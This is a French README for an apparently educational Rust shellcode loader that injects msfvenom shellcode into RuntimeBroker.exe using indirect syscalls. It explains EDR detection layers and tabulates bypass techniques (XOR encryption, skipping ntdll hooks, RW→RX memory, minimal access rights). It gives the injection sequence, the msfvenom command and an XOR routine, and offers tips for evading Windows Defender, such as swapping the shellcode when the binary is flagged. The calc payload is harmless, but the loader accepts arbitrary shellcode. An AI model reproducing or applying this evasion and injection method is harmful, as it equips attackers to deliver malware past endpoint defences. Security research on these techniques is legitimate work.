# 🦀 Rust Syscall Loader

Un loader shellcode éducatif utilisant les **indirect syscalls** en Rust pour exécuter calc.exe sur Windows.

> ⚠️ **AVERTISSEMENT**: Ce projet est uniquement à des fins éducatives et de recherche en sécurité. N'utilisez jamais ces techniques à des fins malveillantes.

---

## 📚 Table des Matières

1. [Concepts Fondamentaux](#-concepts-fondamentaux)
   - [Processus vs Threads](#processus-vs-threads)
   - [Handles Windows](#handles-windows)
   - [Direct vs Indirect Syscalls](#direct-vs-indirect-syscalls)
2. [Comment les EDR Détectent les Menaces](#-comment-les-edr-détectent-les-menaces)
3. [Techniques de Bypass](#-techniques-de-bypass)
4. [Choix du Process Cible](#-choix-du-process-cible)
5. [Architecture du Loader](#-architecture-du-loader)
6. [Flow d'Exécution Détaillé](#-flow-dexécution-détaillé)
7. [Installation & Compilation](#-installation--compilation)
8. [Génération du Shellcode](#-génération-du-shellcode)
9. [Techniques Avancées](#-techniques-avancées)
10. [Troubleshooting](#-troubleshooting)
11. [Ressources](#-ressources)

---

## 🧠 Concepts Fondamentaux

### Processus vs Threads

#### Le Processus

Un **processus** est un container isolé qui contient :

```
┌─────────────────────────────────────────────────────────┐
│                    PROCESSUS                            │
├─────────────────────────────────────────────────────────┤
│  📦 Espace d'adressage virtuel (mémoire privée)        │
│     └── 0x00000000 → 0x7FFFFFFF (user space)           │
│                                                         │
│  🔑 Handle Table (accès aux ressources kernel)         │
│     └── Fichiers, registry, events, autres process...  │
│                                                         │
│  🎫 Token de sécurité (identité + privilèges)          │
│                                                         │
│  📊 PEB (Process Environment Block)                    │
│     └── Liste des DLLs chargées, arguments, env vars   │
│                                                         │
│  🧵 Thread(s)                                          │
└─────────────────────────────────────────────────────────┘
```

**Important** : Le processus **ne s'exécute pas** lui-même - c'est juste un conteneur. Ce qui exécute le code, ce sont les threads.

#### Le Thread

Un **thread** est une unité d'exécution :

```
┌─────────────────────────────────────┐
│             THREAD                  │
├─────────────────────────────────────┤
│  📍 RIP (Instruction Pointer)       │  ← Où j'en suis dans le code
│  📚 Stack (pile d'appels)           │  ← Variables locales, return addresses
│  🗄️ Registres CPU (contexte)        │  ← RAX, RBX, RCX...
│  ⏰ État (Running/Waiting/etc)      │
│  🎫 TEB (Thread Environment)        │
└─────────────────────────────────────┘
```

#### Relation Process/Thread

```
┌──────────────────────────────────────────────────────────┐
│              PROCESSUS (RuntimeBroker.exe)               │
│                                                          │
│   Mémoire partagée entre tous les threads :              │
│   ┌────────────────────────────────────────────┐        │
│   │  Code (.text)  │  Data (.data)  │  Heap    │        │
│   └────────────────────────────────────────────┘        │
│              ↑              ↑             ↑              │
│              │              │             │              │
│   ┌──────────┴───┐  ┌──────┴──────┐  ┌───┴────────┐    │
│   │  Thread 1    │  │  Thread 2   │  │  Thread 3  │    │
│   │  (UWP perms) │  │  (autre)    │  │  (TON      │    │
│   │              │  │             │  │  SHELLCODE)│    │
│   │  Stack 1     │  │  Stack 2    │  │  Stack 3   │    │
│   └──────────────┘  └─────────────┘  └────────────┘    │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

Quand tu fais `NtCreateThreadEx` dans RuntimeBroker, tu crées un **nouveau thread** qui :
- Partage toute la mémoire du process (donc peut lire/écrire ton shellcode)
- A son propre stack et registres
- Démarre à l'adresse que tu lui donnes (ton shellcode)

#### Le Scheduler Windows

Le kernel Windows a un **scheduler** qui décide quel thread tourne sur quel CPU :

```
CPU Core 0          CPU Core 1          CPU Core 2
    │                   │                   │
    ▼                   ▼                   ▼
┌────────┐         ┌────────┐         ┌────────┐
│Thread A│ ←─┐     │Thread C│         │Thread E│
└────────┘   │     └────────┘         └────────┘
             │
    Quantum expiré (timeslice ~15ms)
             │
             ▼
┌────────┐
│Thread B│  (en attente)
└────────┘
```

Chaque thread a un **quantum** (temps d'exécution). Quand il expire, le scheduler passe au suivant. C'est pour ça que ton shellcode peut s'exécuter "en parallèle" du code légitime de RuntimeBroker.

---

### Handles Windows

#### Handle ≠ Objet

Un **handle** est une "télécommande" vers un objet kernel, pas l'objet lui-même.

```
┌─────────────────────────────────────────────────────────────┐
│                      TON LOADER                             │
│                                                             │
│   thread_handle ──────────X  (NtClose)                      │
│        │                                                    │
│        │ (était une référence vers...)                      │
└────────│────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│                  RUNTIMEBROKER.EXE                          │
│                                                             │
│   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐    │
│   │  Thread 1   │    │  Thread 2   │    │  Thread 3   │    │
│   │  (UWP)      │    │  (autre)    │    │ (SHELLCODE) │    │
│   │             │    │             │    │             │    │
│   │  Running    │    │  Waiting    │    │  Running ✓  │    │
│   └─────────────┘    └─────────────┘    └─────────────┘    │
│                                              │              │
│                                              ▼              │
│                                      Exécute calc.exe      │
│                                      puis se termine       │
└─────────────────────────────────────────────────────────────┘
```

Quand tu fais `NtClose(thread_handle)`, tu fermes le **handle**, pas le thread !

#### Reference Counting

Le thread a son propre "reference count" dans le kernel :

```
NtCreateThreadEx:
  Kernel crée Thread object
  RefCount = 1 (le thread lui-même)
  RefCount = 2 (ton handle)

NtClose(thread_handle):
  RefCount = 1 (reste le thread lui-même)
  Thread continue de tourner!

Quand shellcode termine:
  RefCount = 0
  Kernel détruit le Thread object
```

#### Pourquoi fermer les handles ?

1. **Hygiène** - éviter les memory/handle leaks
2. **Stealth** - réduire les traces forensiques

```
Avant NtClose:
┌────────────────────────────────────────────┐
│ LOADER.EXE - Handle Table                  │
├────────────────────────────────────────────┤
│ Handle 0x1A4 → Process RUNTIMEBROKER.EXE   │  ← Visible!
│ Handle 0x1B8 → Thread dans RUNTIMEBROKER   │  ← Suspect!
└────────────────────────────────────────────┘

Après NtClose:
┌────────────────────────────────────────────┐
│ LOADER.EXE - Handle Table                  │
├────────────────────────────────────────────┤
│ (vide)                                     │  ← Clean
└────────────────────────────────────────────┘
```

---

### Direct vs Indirect Syscalls

#### Flux Normal (avec hooks EDR)

```
[Programme] → [kernel32.dll] → [ntdll.dll] → [SYSCALL] → [Kernel]
                    ↑               ↑
              EDR Hook          EDR Hook
```

Les EDR injectent du code (hooks) dans `ntdll.dll` pour **intercepter** tous les appels système.

#### Flux avec Direct Syscalls

```
[Programme] → [SYSCALL direct] → [Kernel Windows]
                    ↑
              L'EDR ne voit rien !
              Mais call stack suspecte (pas de ntdll)
```

#### Flux avec Indirect Syscalls (v4)

```
[Programme] → [Setup registres] → [JMP ntdll+X] → [SYSCALL] → [Kernel]
                                        ↑
                                  Call stack légitime!
                                  (RIP pointe dans ntdll)
```

L'**indirect syscall** saute directement à l'instruction `syscall` dans ntdll, APRÈS les hooks EDR. Résultat : call stack propre, comme si l'appel venait de ntdll.

#### Syscalls Utilisés

| Syscall | Description |
|---------|-------------|
| `NtOpenProcess` | Ouvre le processus cible (RuntimeBroker.exe) avec droits minimum |
| `NtAllocateVirtualMemory` | Alloue de la mémoire RW dans le processus cible |
| `NtWriteVirtualMemory` | Écrit le shellcode dans la mémoire distante |
| `NtProtectVirtualMemory` | Change la protection mémoire RW → RX |
| `NtCreateThreadEx` | Crée un thread distant pour exécuter le shellcode |
| `NtClose` | Ferme les handles (process et thread) |

---

## 🔍 Comment les EDR Détectent les Menaces

### Modèle de Détection Multi-Couches

```
1. SIGNATURE STATIQUE
   └── Scan du fichier sur disque
   └── Pattern matching (shellcode connu, strings suspectes)
   └── ❌ Bypassé par XOR encryption

2. HOOKS NTDLL (comportemental)
   └── Intercepte NtAllocateVirtualMemory, NtWriteVirtualMemory...
   └── Analyse la séquence d'appels
   └── ❌ Bypassé par indirect syscalls

3. CALL STACK ANALYSIS
   └── Vérifie que les syscalls viennent de ntdll
   └── ❌ Bypassé par indirect syscalls (RIP dans ntdll)

4. ETW (Event Tracing for Windows)
   └── Events kernel-level
   └── Plus dur à bypass, mais moins de coverage

5. AMSI (pour scripts PowerShell/VBA)
   └── Pas applicable ici (c'est du Rust compilé)
```

### Actions Normales vs Suspectes

```
Actions NORMALES (des millions de programmes font ça) :
✅ Énumérer les processes (Task Manager fait ça)
✅ Ouvrir un fichier
✅ Lire la registry

Actions SUSPECTES (comportement de malware) :
⚠️ Allouer mémoire RWX
⚠️ Écrire dans la mémoire d'un autre process
⚠️ Créer un thread distant
⚠️ Appeler VirtualProtect RW→RX
⚠️ Séquence : Alloc → Write → Protect → CreateThread
```

---

## 🛡️ Techniques de Bypass

### Tableau des Techniques

| Technique | Ce que ça bypass |
|-----------|------------------|
| Indirect syscalls | Hooks ntdll.dll + call stack analysis |
| XOR encryption | Signature statique |
| Process injection | Heuristique "shellcode dans le loader" |
| RW→RX au lieu de RWX | Heuristique mémoire suspecte |
| Droits minimum (0x002A) | Heuristique "PROCESS_ALL_ACCESS suspect" |
| Injection dans process existant | Pas de spawn suspect |

---

## 🎯 Choix du Process Cible

### Pourquoi pas explorer.exe ?

- C'est LE process le plus surveillé par les EDR (high-value target)
- Si tu le crash, tout le shell Windows meurt (bureau, taskbar, etc.)
- Injection dans explorer = red flag immédiat

### Candidats Recommandés

| Process | Description | Instances | Si crash | Risque EDR | Contexte |
|---------|-------------|-----------|----------|------------|----------|
| `RuntimeBroker.exe` | Permissions apps UWP | 2-5 | Respawn auto | 🟢 Low | **User** ✓ |
| `taskhostw.exe` | Host scheduled tasks | 1-3 | Task morte | 🟢 Low | User |
| `sihost.exe` | Shell Infrastructure Host | 1 | Start menu bugué | 🟡 Medium | User |
| `dllhost.exe` | COM Surrogate (thumbnails) | 0-5+ | Rien de visible | 🟢 Low | ⚠️ Souvent SYSTEM |
| `explorer.exe` | Shell Windows | 1 | Desktop mort | 🔴 High | User |

### Pourquoi RuntimeBroker.exe ? (Recommandé)

```
┌─────────────────────────────────────────────────────────────┐
│                   RuntimeBroker.exe                         │
├─────────────────────────────────────────────────────────────┤
│  ✓ Toujours présent (2-5 instances minimum)                │
│  ✓ Tourne sous le contexte USER (pas SYSTEM!)              │
│  ✓ Pas besoin de droits admin pour l'ouvrir                │
│  ✓ Pas surveillé par les EDR (low profile)                 │
│  ✓ Si crash → Windows en respawn un autre                  │
│  ✓ Gère les permissions UWP = activité normale             │
└─────────────────────────────────────────────────────────────┘
```

### Pourquoi pas dllhost.exe ?

`dllhost.exe` peut tourner sous **SYSTEM** (pour certains handlers COM), ce qui cause `STATUS_ACCESS_DENIED` (0xC0000022) même en admin. RuntimeBroker tourne toujours sous ton user.

---

## 🏗️ Architecture du Loader

### Structure du Projet

```
loader_rust/
├── Cargo.toml          # Dépendances et configuration
├── .cargo/
│   └── config.toml     # Configuration cross-compilation
├── src/
│   └── main.rs         # Code principal avec syscalls
└── README.md           # Ce fichier
```

### Vue d'Ensemble du Code

```rust
fn main() {
    // 1. Trouver RuntimeBroker.exe existant
    let pid = find_process_pid("RuntimeBroker.exe");

    // 2. Inject shellcode
    inject_shellcode(pid, &ENCRYPTED_SHELLCODE);
}

fn find_process_pid(name: &str) -> Option<u32> {
    // CreateToolhelp32Snapshot + Process32First/Next
    // Énumère tous les processes, retourne le PID du match
}

fn inject_shellcode(pid: u32, shellcode: &[u8]) {
    // XOR decrypt
    let decrypted = xor_decrypt(shellcode, &XOR_KEY);

    // Open target process (minimum rights!)
    syscall!("NtOpenProcess", pid, 0x002A)  // Not PROCESS_ALL_ACCESS!

    // Allocate RW memory in target
    syscall!("NtAllocateVirtualMemory", PAGE_READWRITE)

    // Write shellcode (indirect syscall!)
    syscall!("NtWriteVirtualMemory", shellcode)

    // Change to RX
    syscall!("NtProtectVirtualMemory", PAGE_EXECUTE_READ)

    // Create remote thread
    syscall!("NtCreateThreadEx", ...)

    // Cleanup with syscalls
    syscall!("NtClose", thread_handle)
    syscall!("NtClose", process_handle)
}
```

---

## 🔄 Flow d'Exécution Détaillé

### Timeline Complète

```
Timeline:
─────────────────────────────────────────────────────────────►

LOADER:
  │
  ├── CreateToolhelp32Snapshot → Liste processes
  ├── Process32First/Next → Trouve RuntimeBroker.exe → PID
  ├── NtOpenProcess(RuntimeBroker) → process_handle
  ├── NtAllocateVirtualMemory → alloue dans RuntimeBroker
  ├── NtWriteVirtualMemory → copie shellcode
  ├── NtProtectVirtualMemory → RW → RX
  ├── NtCreateThreadEx → thread_handle (thread DEMARRE ici!)
  │         │
  │         │ Le thread est lancé, il tourne indépendamment
  │         ▼
  ├── NtClose(thread_handle)   ← Juste "je m'en fiche maintenant"
  ├── NtClose(process_handle)  ← Pareil
  └── exit(0)  ← Loader se termine

                    PENDANT CE TEMPS dans RuntimeBroker...

THREAD SHELLCODE:
  │
  ├── Démarre à l'adresse du shellcode
  ├── Exécute les opcodes
  ├── Lance calc.exe
  └── Thread se termine (ExitThread)
                            │
                            ▼
                    calc.exe est ouvert!
```

### État Final

```
┌──────────────────┐
│ LOADER.EXE       │ ← Terminé, n'existe plus
└──────────────────┘

┌──────────────────┐
│ RUNTIMEBROKER.EXE│ ← Toujours là, thread shellcode terminé
│                  │   (RuntimeBroker fonctionne normalement)
└──────────────────┘

┌──────────────────┐
│ CALC.EXE         │ ← Nouveau process, indépendant
│                  │   (la calculatrice est ouverte!)
└──────────────────┘
```

---

## 🛠️ Installation & Compilation

### Prérequis

1. **Rust Nightly** (requis pour rust_syscalls)
```bash
rustup install nightly
rustup default nightly
```

2. **Target Windows** (pour cross-compilation depuis macOS/Linux)
```bash
rustup target add x86_64-pc-windows-gnu
```

3. **MinGW-w64** (linker pour Windows)
```bash
# macOS
brew install mingw-w64

# Linux (Debian/Ubuntu)
sudo apt install mingw-w64
```

### Build pour Windows (depuis macOS)

```bash
# Debug build
cargo build --target x86_64-pc-windows-gnu

# Release build (recommandé)
cargo build --release --target x86_64-pc-windows-gnu
```

Le binaire sera généré dans :
```
target/x86_64-pc-windows-gnu/release/calc_loader.exe
```

### Configuration Cross-Compilation

Créez `.cargo/config.toml` :

```toml
[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
```

### Optimisations Release

Dans `Cargo.toml` :

```toml
[profile.release]
opt-level = "z"      # Optimise pour la taille
lto = true           # Link Time Optimization
panic = "abort"      # Pas de stack unwinding
strip = true         # Strip symbols
codegen-units = 1    # Meilleures optimisations globales
```

---

## 🔧 Génération du Shellcode

### Installation de Metasploit (macOS)

```bash
# Option 1: Homebrew (recommandé)
brew install metasploit

# Option 2: Docker
docker run -it --rm metasploitframework/metasploit-framework msfvenom [options]
```

### Commande de Génération

```bash
# ⚠️ IMPORTANT: Utiliser EXITFUNC=thread !
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f rust
```

### EXITFUNC Expliqué

| Option | Fonction appelée | Effet |
|--------|------------------|-------|
| `process` | `ExitProcess()` | ❌ Tue tout le process hôte (RuntimeBroker meurt) |
| `thread` | `ExitThread()` | ✅ Tue juste le thread injecté (RuntimeBroker survit) |
| `seh` | Exception SEH | Exit via exception handler |
| `none` | Rien | Le shellcode continue/crash |

#### Ce qui se passe avec EXITFUNC=thread (correct)

```
┌─────────────────────────────────────┐
│        RUNTIMEBROKER.EXE            │
│                                     │
│  Thread Main ──► Continue normal ✓  │
│                                     │
│  Thread Shell ─► WinExec(calc)      │
│                  ExitThread(0)      │
│                       │             │
│                       ▼             │
│                  Thread MORT        │
│                  (RuntimeBroker OK) │
└─────────────────────────────────────┘
```

### Chiffrement XOR

Après génération, chiffrez le shellcode avec une clé XOR pour éviter la détection statique :

```rust
fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect()
}
```

---

## 🎯 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| Indirect Syscalls | Saute dans ntdll après le hook (call stack légitime) | ⭐⭐ |
| Hell's Gate | Récupère SSN dynamiquement en parsant ntdll | ⭐⭐⭐ |
| Halo's Gate | Hell's Gate + gère les fonctions hookées | ⭐⭐⭐⭐ |
| TartarusGate | Halo's Gate amélioré | ⭐⭐⭐⭐⭐ |
| Sleep Obfuscation | Chiffre le shellcode pendant les sleep | ⭐⭐⭐ |
| Module Stomping | Écrase une DLL légitime avec ton code | ⭐⭐⭐⭐ |
| Process Hollowing | Remplace le code d'un process suspendu | ⭐⭐⭐ |
| Thread Hijacking | Détourne un thread existant au lieu d'en créer | ⭐⭐⭐⭐ |

---

## 🐛 Troubleshooting

### Erreur de compilation "linker not found"

```bash
# Vérifiez que mingw-w64 est installé
which x86_64-w64-mingw32-gcc

# Si pas trouvé, installez-le
brew install mingw-w64
```

### Erreur "requires nightly"

```bash
rustup default nightly
# ou
cargo +nightly build --release --target x86_64-pc-windows-gnu
```

### NtOpenProcess failed: 0xC0000022 (STATUS_ACCESS_DENIED)

Le process cible tourne sous SYSTEM ou un autre user. Solutions :

1. **Utilise RuntimeBroker.exe** (tourne toujours sous ton user)
2. Ou lance le loader en **admin**
3. Ou essaie un autre process : `taskhostw.exe`, `sihost.exe`

```rust
// Change la cible dans le code
let pid = match find_process_pid("RuntimeBroker.exe") {
```

### "RuntimeBroker.exe not found"

Très rare — RuntimeBroker tourne toujours si t'as des apps UWP (Settings, Calculator, etc.). Ouvre juste les Settings Windows pour en spawner un.

### RuntimeBroker se ferme avec calc.exe

Tu as oublié `EXITFUNC=thread` ! Régénère le shellcode :

```bash
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f rust
```

### Windows Defender bloque l'exécution

Avec la v4, le loader devrait bypass Defender grâce à :
- XOR encryption du shellcode (pas de signature statique)
- Process injection dans un process existant
- Indirect syscalls (bypass hooks ntdll + call stack légitime)
- RW→RX (pas de RWX suspect)
- Droits minimum (0x002A)

Si toujours détecté :
1. Rebuild sur une machine propre (hash grillé ?)
2. Changez le shellcode (msfvenom est très connu)
3. Utilisez une VM isolée pour tester
4. Considérez sleep obfuscation

---

## 🚀 Utilisation

1. Compilez le projet
2. Transférez le `.exe` sur une VM Windows
3. Exécutez-le → La calculatrice s'ouvre !

```powershell
# Sur Windows - Téléchargement depuis un serveur HTTP
Invoke-WebRequest -Uri "http://192.168.x.x:8080/target/x86_64-pc-windows-gnu/release/calc_loader.exe" -OutFile "loader.exe"

# Exécution
.\loader.exe
```

---

## 📊 Versions

| Version | Techniques | Description |
|---------|------------|-------------|
| v1 | Direct syscalls | Shellcode dans le loader |
| v2 | + XOR + RW→RX | Encryption + meilleure protection mémoire |
| v3 | + Process injection (notepad) | Spawn notepad + injection |
| v4 | + Indirect syscalls + RuntimeBroker | Injection dans process existant (user context) |

---

## 📖 Ressources

- [rust_syscalls](https://github.com/janoglezcampos/rust_syscalls) - Bibliothèque syscalls Rust (direct + indirect)
- [Rust-for-Malware-Development](https://github.com/Whitecat18/Rust-for-Malware-Development) - Exemples et techniques
- [SysWhispers3](https://github.com/klezVirus/SysWhispers3) - Génération de syscalls
- [Red Team Notes - Syscalls](https://www.ired.team/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs) - Tutoriels syscalls

---

## ⚖️ Disclaimer

Ce projet est fourni uniquement à des fins éducatives. L'auteur n'est pas responsable de toute utilisation malveillante. Testez uniquement sur des systèmes dont vous êtes propriétaire ou sur lesquels vous avez une autorisation explicite.

---

**Happy Hacking! 🦀**
